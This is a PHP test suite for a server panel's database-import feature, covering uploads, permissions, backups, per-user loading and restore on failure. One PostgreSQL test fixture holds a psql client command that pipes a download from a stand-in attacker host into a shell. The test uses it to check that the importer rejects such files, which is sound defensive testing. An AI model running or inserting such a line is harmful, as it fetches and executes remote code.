<?php

use App\Actions\Server\Database\ImportDatabase;
use App\Enums\ExportStatus;
use App\Enums\ImportStatus;
use App\Jobs\RunDatabaseImport;
use App\Models\Database;
use App\Models\DatabaseExport;
use App\Models\DatabaseImport;
use App\Models\DatabaseUser;
use App\Models\User;
use Database\Seeders\PermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Process;
use Illuminate\Support\Facades\Queue;

/*
 * Import a file into a database, replacing its contents (2026-10-14).
 *
 * The properties that matter, in the order a run meets them: nothing is
 * dropped before the file has been checked and the database backed up; the
 * file is loaded as the database's own user, never the admin account; a failed
 * load puts the backup back; and every failure says what happened to the data.
 */

uses(RefreshDatabase::class);

beforeEach(function () {
    $this->seed(PermissionSeeder::class);

    $this->dir = sys_get_temp_dir().'/sv-import-'.getmypid();
    File::deleteDirectory($this->dir);
    config([
        'server.databases.import_dir' => $this->dir.'/imports',
        'server.databases.export_dir' => $this->dir.'/exports',
        'server.databases.auth_file_dir' => $this->dir,
    ]);
    File::ensureDirectoryExists($this->dir);

    $this->runs = [];
    $this->failOn = null;
    Process::fake(function ($process) {
        $command = implode(' ', (array) $process->command);
        $input = $process->input;
        $run = ['command' => $command, 'input' => is_resource($input) ? stream_get_contents($input) : (string) $input];

        // The credentials files are deleted the moment the command returns,
        // so read whichever one this command names now.
        if (preg_match('/--defaults-extra-file=(\S+)/', $command, $m) && is_file($m[1])) {
            $run['auth'] = file_get_contents($m[1]);
        }
        if (isset($process->environment['PGPASSFILE']) && is_file($process->environment['PGPASSFILE'])) {
            $run['auth'] = file_get_contents($process->environment['PGPASSFILE']);
        }
        $this->runs[] = $run;

        if ($this->failOn !== null && str_contains($command.' '.$run['input'], $this->failOn)) {
            return Process::result(errorOutput: 'simulated failure', exitCode: 1);
        }

        return Process::result(output: '1');
    });

    $this->user = User::factory()->admin()->create();
    $this->actingAs($this->user);

    $this->database = Database::factory()->create(['engine' => 'mariadb', 'name' => 'shop_db']);
    $this->dbUser = DatabaseUser::factory()->create(['database_id' => $this->database->id, 'username' => 'shop_user', 'password' => 'user-secret']);
});

afterEach(fn () => File::deleteDirectory($this->dir));

/** An import whose file has fully arrived, ready to run. */
function uploadedImport(Database $database, string $contents, string $name = 'dump.sql'): DatabaseImport
{
    $import = DatabaseImport::create([
        'database_id' => $database->id,
        'database_name' => $database->name,
        'engine' => $database->engine,
        'original_name' => $name,
        'size_bytes' => strlen($contents),
        'received_bytes' => strlen($contents),
        'status' => ImportStatus::Queued,
        'user_id' => test()->user->id,
    ]);
    File::ensureDirectoryExists(config('server.databases.import_dir'));
    file_put_contents(config('server.databases.import_dir')."/{$import->id}.upload", $contents);

    return $import;
}

function runImport(DatabaseImport $import): DatabaseImport
{
    app(ImportDatabase::class)->execute($import);

    return $import->refresh();
}

/** Index of the first recorded run whose command (or stdin) contains $needle. */
function importRunIndex(string $needle): ?int
{
    foreach (test()->runs as $i => $run) {
        if (str_contains($run['command'].' '.$run['input'], $needle)) {
            return $i;
        }
    }

    return null;
}

describe('uploading', function () {

    it('starts an upload and takes the file in chunks', function () {
        $begin = $this->postJson("/api/databases/{$this->database->id}/imports", ['file_name' => 'C:\\dumps\\shop.sql', 'size_bytes' => 10])
            ->assertCreated()
            ->assertJsonPath('import.status', 'uploading')
            // The name is shown back, never used as a path.
            ->assertJsonPath('import.file_name', 'shop.sql');

        expect($begin->json('max_chunk'))->toBeInt();
        $id = $begin->json('import.id');

        $this->call('PUT', "/api/databases/{$this->database->id}/imports/{$id}/chunk", [], [], [], ['CONTENT_TYPE' => 'application/octet-stream'], 'SELECT')
            ->assertOk()->assertJsonPath('received', 6);
        $this->call('PUT', "/api/databases/{$this->database->id}/imports/{$id}/chunk", [], [], [], ['CONTENT_TYPE' => 'application/octet-stream'], " 1;\n")
            ->assertOk()->assertJsonPath('received', 10);
    });

    it('cuts off and refuses a body past the declared size', function () {
        $id = $this->postJson("/api/databases/{$this->database->id}/imports", ['file_name' => 'a.sql', 'size_bytes' => 4])->json('import.id');

        $this->call('PUT', "/api/databases/{$this->database->id}/imports/{$id}/chunk", [], [], [], [], 'SELECT 1;')
            ->assertStatus(422);

        expect(filesize(config('server.databases.import_dir')."/{$id}.upload"))->toBe(4);
    });

    it('refuses a file over the limit before it is sent', function () {
        config(['server.databases.import_max_bytes' => 100]);

        $this->postJson("/api/databases/{$this->database->id}/imports", ['file_name' => 'big.sql', 'size_bytes' => 101])
            ->assertStatus(422)
            ->assertJsonValidationErrors('size_bytes');
    });

    /*
     * The run would refuse anyway — but after the user had sent the whole file.
     * The admin account is never the fallback: it can write every database.
     */
    it('refuses before the upload when no user of the database can run it', function (array $user) {
        $this->dbUser->forceFill($user)->save();

        $this->postJson("/api/databases/{$this->database->id}/imports", ['file_name' => 'a.sql', 'size_bytes' => 10])
            ->assertStatus(422)
            ->assertJsonFragment(['database' => [__('errors/database.import_no_account')]]);

        expect(DatabaseImport::count())->toBe(0);
    })->with([
        'password unknown (adopted from v7)' => [['password' => null]],
        'remote-only user' => [['connection_preference' => 'remote', 'host' => '203.0.113.5']],
    ]);

    it('allows one import per database at a time', function () {
        $this->postJson("/api/databases/{$this->database->id}/imports", ['file_name' => 'a.sql', 'size_bytes' => 10])->assertCreated();

        $this->postJson("/api/databases/{$this->database->id}/imports", ['file_name' => 'b.sql', 'size_bytes' => 10])
            ->assertStatus(422)
            ->assertJsonFragment(['database' => [__('errors/database.import_already_running')]]);
    });

    it('will not take a chunk for another database\'s import', function () {
        $id = $this->postJson("/api/databases/{$this->database->id}/imports", ['file_name' => 'a.sql', 'size_bytes' => 10])->json('import.id');
        $other = Database::factory()->create();

        $this->call('PUT', "/api/databases/{$other->id}/imports/{$id}/chunk", [], [], [], [], 'x')->assertNotFound();
    });
});

describe('starting', function () {

    beforeEach(function () {
        $this->import = DatabaseImport::create([
            'database_id' => $this->database->id, 'database_name' => 'shop_db', 'engine' => 'mariadb',
            'original_name' => 'a.sql', 'size_bytes' => 9, 'status' => ImportStatus::Uploading, 'user_id' => $this->user->id,
        ]);
        File::ensureDirectoryExists(config('server.databases.import_dir'));
        file_put_contents(config('server.databases.import_dir')."/{$this->import->id}.upload", 'SELECT 1;');
        Queue::fake();
    });

    it('needs the user to confirm the replace — the warning is not optional', function () {
        $this->postJson("/api/databases/{$this->database->id}/imports/{$this->import->id}/start", [])
            ->assertStatus(422)
            ->assertJsonFragment(['confirm_replace' => [__('errors/database.import_confirm_required')]]);

        Queue::assertNothingPushed();
    });

    it('queues the run once confirmed', function () {
        $this->postJson("/api/databases/{$this->database->id}/imports/{$this->import->id}/start", ['confirm_replace' => true])
            ->assertStatus(202)
            ->assertJsonPath('import.status', 'queued');

        Queue::assertPushed(RunDatabaseImport::class);
    });

    it('refuses to start before the whole file has arrived', function () {
        $this->import->update(['size_bytes' => 100]);

        $this->postJson("/api/databases/{$this->database->id}/imports/{$this->import->id}/start", ['confirm_replace' => true])
            ->assertStatus(422)
            ->assertJsonValidationErrors('file');
    });

    it('refuses while the database is being exported, and the export refuses while it imports', function () {
        $export = DatabaseExport::create(['database_id' => $this->database->id, 'database_name' => 'shop_db', 'engine' => 'mariadb', 'status' => ExportStatus::Running, 'started_at' => now()]);

        $this->postJson("/api/databases/{$this->database->id}/imports/{$this->import->id}/start", ['confirm_replace' => true])
            ->assertStatus(422)
            ->assertJsonFragment(['database' => [__('errors/database.import_export_running')]]);

        $export->delete();
        $this->import->update(['status' => ImportStatus::Running, 'started_at' => now()]);

        $this->postJson("/api/databases/{$this->database->id}/export")
            ->assertStatus(422)
            ->assertJsonFragment(['database' => [__('errors/database.export_import_running')]]);
    });

    it('cannot be cancelled while it runs, can be while it uploads', function () {
        $this->import->update(['status' => ImportStatus::Running, 'started_at' => now()]);
        $this->deleteJson("/api/databases/{$this->database->id}/imports/{$this->import->id}")->assertStatus(409);

        $this->import->update(['status' => ImportStatus::Uploading]);
        $this->deleteJson("/api/databases/{$this->database->id}/imports/{$this->import->id}")->assertNoContent();

        expect(file_exists(config('server.databases.import_dir')."/{$this->import->id}.upload"))->toBeFalse();
    });

    it('is refused to a view-only role', function () {
        $viewer = User::factory()->create();
        grantPermission($viewer, 'database');
        $this->actingAs($viewer);

        $this->postJson("/api/databases/{$this->database->id}/imports", ['file_name' => 'a.sql', 'size_bytes' => 10])->assertForbidden();
        $this->postJson("/api/databases/{$this->database->id}/imports/{$this->import->id}/start", ['confirm_replace' => true])->assertForbidden();
        $this->getJson("/api/databases/{$this->database->id}/imports")->assertOk();
    });
});

describe('a run', function () {

    it('checks, backs up, then replaces — loading as the database\'s own user', function () {
        $import = runImport(uploadedImport($this->database, "CREATE DATABASE `x`;\nUSE `x`;\nCREATE TABLE t (id int);\n"));

        // MariaDB's dump client, the engine under test.
        $dump = importRunIndex('mariadb-dump');
        $drop = importRunIndex('DROP DATABASE');
        $load = collect($this->runs)->search(fn ($r) => str_contains($r['command'], '--binary-mode'));

        expect($import->status)->toBe(ImportStatus::Completed)
            // Backed up before anything was dropped.
            ->and($dump)->not->toBeNull()
            ->and($drop)->toBeGreaterThan($dump)
            ->and($load)->toBeGreaterThan($drop)
            // As the database's user, with client commands switched off.
            ->and($this->runs[$load]['auth'])->toContain('user="shop_user"')
            ->and($this->runs[$load]['auth'])->toContain('password="user-secret"')
            ->and($this->runs[$load]['command'])->toEndWith('--batch --binary-mode shop_db')
            // The cleaned file, not the upload.
            ->and($this->runs[$load]['input'])->toBe("CREATE TABLE t (id int);\n");

        $safety = DatabaseExport::find($import->safety_export_id);
        expect($safety->purpose)->toBe(DatabaseExport::PURPOSE_IMPORT_SAFETY)
            ->and($safety->status)->toBe(ExportStatus::Completed)
            ->and(glob(config('server.databases.import_dir').'/*'))->toBe([]);
    });

    it('puts the backup back when the load fails, and says so', function () {
        $this->failOn = '--binary-mode';

        $import = runImport(uploadedImport($this->database, "CREATE TABLE t (id int);\n"));

        $restore = collect($this->runs)->search(fn ($r) => str_contains($r['command'], '-e source '));

        expect($import->status)->toBe(ImportStatus::Failed)
            ->and($import->reason)->toBe('load_failed')
            ->and($import->restored)->toBeTrue()
            // Put back as the panel: it is the panel's own dump.
            ->and($restore)->not->toBeFalse()
            ->and($this->runs[$restore]['auth'])->not->toContain('shop_user')
            ->and($import->message())->toContain(__('database.import_failed.restored'));
    });

    it('drops nothing when the backup fails', function () {
        $this->failOn = 'mariadb-dump';

        $import = runImport(uploadedImport($this->database, "CREATE TABLE t (id int);\n"));

        expect($import->reason)->toBe('backup_failed')
            ->and(importRunIndex('DROP DATABASE'))->toBeNull()
            ->and($import->message())->toContain(__('database.import_failed.untouched'));
    });

    it('says the backup is in Exports when even putting it back failed', function () {
        // The backup goes through; every drop after it fails, so the load and
        // the putting back both fail.
        $this->failOn = 'DROP DATABASE';
        $import = runImport(uploadedImport($this->database, "CREATE TABLE t (id int);\n"));

        expect($import->restored)->toBeFalse()
            ->and($import->message())->toContain(__('database.import_failed.not_restored'));
    });

    it('refuses a file of the wrong kind before touching anything', function () {
        $import = runImport(uploadedImport($this->database, "PGDMP\x01\x0e\x00binary"));

        expect($import->reason)->toBe('wrong_format')
            ->and($this->runs)->toBe([])
            ->and($import->message())->toContain(__('database.import_failed.untouched'));
    });

    it('refuses a PostgreSQL file with a psql command before touching anything, naming the line', function () {
        $pg = Database::factory()->create(['engine' => 'postgresql', 'name' => 'pg_db']);
        DatabaseUser::factory()->create(['database_id' => $pg->id, 'username' => 'pg_user']);

        $import = runImport(uploadedImport($pg, "CREATE TABLE t (id int);\n\\! curl evil.example | sh\n"));

        expect($import->reason)->toBe('client_command')
            ->and($import->line)->toBe(2)
            ->and($this->runs)->toBe([])
            ->and($import->message())->toContain('2');
    });

    it('loads PostgreSQL as the user, over TCP, in one transaction', function () {
        $pg = Database::factory()->create(['engine' => 'postgresql', 'name' => 'pg_db']);
        DatabaseUser::factory()->create(['database_id' => $pg->id, 'username' => 'pg_user', 'password' => 'pg-secret']);

        $import = runImport(uploadedImport($pg, "CREATE TABLE t (id int);\nALTER TABLE t OWNER TO someone_else;\n"));

        $load = collect($this->runs)->search(fn ($r) => str_contains($r['command'], '--single-transaction'));

        expect($import->status)->toBe(ImportStatus::Completed)
            ->and($this->runs[$load]['command'])->toContain('--username=pg_user')
            ->and($this->runs[$load]['command'])->toContain('--no-psqlrc')
            ->and($this->runs[$load]['command'])->toContain('--set=ON_ERROR_STOP=1')
            ->and($this->runs[$load]['auth'])->toEndWith(":pg_user:pg-secret\n");
    });

    it('renames a MongoDB archive into this database, as its user', function (bool $gzip) {
        $mongo = Database::factory()->create(['engine' => 'mongodb', 'name' => 'mongo_db']);
        DatabaseUser::factory()->create(['database_id' => $mongo->id, 'username' => 'mongo_user']);
        $archive = "\x6d\xe2\x99\x81".str_repeat("\0", 16);

        $import = runImport(uploadedImport($mongo, $gzip ? gzencode($archive) : $archive, 'dump.archive'));

        $load = collect($this->runs)->search(fn ($r) => str_contains($r['command'], '--nsTo=mongo_db.$coll$'));

        expect($import->status)->toBe(ImportStatus::Completed)
            ->and($this->runs[$load]['command'])->toContain('--username=mongo_user')
            ->and($this->runs[$load]['command'])->toContain('--authenticationDatabase=mongo_db')
            ->and($this->runs[$load]['command'])->toContain('--nsExclude=admin.*')
            ->and(str_contains($this->runs[$load]['command'], '--gzip'))->toBe($gzip);
    })->with(['plain' => false, 'gzip' => true]);
});

it('reaps an upload abandoned for a day, so the database can be imported into again', function () {
    $stale = DatabaseImport::create([
        'database_id' => $this->database->id, 'database_name' => 'shop_db', 'engine' => 'mariadb',
        'original_name' => 'a.sql', 'size_bytes' => 9, 'status' => ImportStatus::Uploading, 'user_id' => $this->user->id,
    ]);
    DatabaseImport::query()->whereKey($stale->id)->update(['updated_at' => now()->subDays(2)]);

    $this->getJson("/api/databases/{$this->database->id}/imports")
        ->assertOk()
        ->assertJsonPath('imports.0.reason', 'abandoned');

    $this->postJson("/api/databases/{$this->database->id}/imports", ['file_name' => 'b.sql', 'size_bytes' => 10])->assertCreated();
});
